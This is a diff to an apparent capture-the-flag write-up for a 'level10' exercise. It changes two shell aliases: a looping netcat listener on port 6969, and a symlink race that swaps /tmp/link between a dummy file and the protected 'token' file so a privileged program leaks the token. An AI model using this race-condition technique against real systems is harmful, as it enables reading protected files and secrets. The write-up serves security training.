@@ -46,13 +46,13 @@ To solve this exercise, I used several commands to achieve the race condition:
 First, I need to listen at port 6969:
 
 ```bash
-alias listen="nc -l 6969"
+alias listen="while true; do nc -l 6969; done"
 ```
 
 Then I need to set a link to a file that can be read by the level10 user and set it back to the token:
 
 ```bash
-alias race="touch /tmp/dummy; while true; do ln -sf /tmp/dummy /tmp/link && ln -sf token /tmp/link; done"
+alias race="touch /tmp/dummy; while true; do ln -sf /tmp/dummy /tmp/link && ln -sf $(realpath token) /tmp/link; done"
 ```
 
 I need to start the program 'level10' to send the value of 'token' to 127.0.0.1:
